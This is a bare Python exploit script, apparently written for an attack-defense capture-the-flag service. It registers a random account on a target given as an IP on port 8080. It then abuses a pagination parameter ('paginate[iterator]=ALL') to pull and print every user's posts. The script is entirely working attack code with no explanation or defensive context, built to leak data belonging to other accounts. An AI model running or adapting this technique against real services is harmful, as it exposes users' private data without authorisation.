#!/usr/bin/env python3
import sys
import secrets
from requests import Session
ip = sys.argv[1]

url = f'http://{ip}:8080'
login = secrets.token_hex(10)
password = login

s = Session()
resp = s.post(url + '/api/register', data = {'login':login, 'password': password})

all_posts = s.get(url + '/api/posts/user?paginate[iterator]=ALL').json()['posts']

print(all_posts, flush=True)

